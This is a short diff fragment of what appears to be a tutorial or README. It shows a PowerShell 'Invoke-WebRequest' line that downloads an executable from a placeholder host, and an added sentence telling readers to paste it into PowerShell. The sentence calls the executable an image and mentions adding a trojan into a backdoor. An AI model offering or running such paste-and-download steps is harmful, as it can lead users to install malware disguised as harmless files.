@@ -41,5 +41,5 @@ Then after this it will be redirected to desktop and after that paste the comman
 Invoke  WebRequest 'https://website.com/file.exe' -OutFile file.exe 
 
 ```
-
+Paste this into your powershell and you will able to downlode the image you can see it on desktop, But if you need to add trojan into backdoor you need to add som new command to codeline.
 
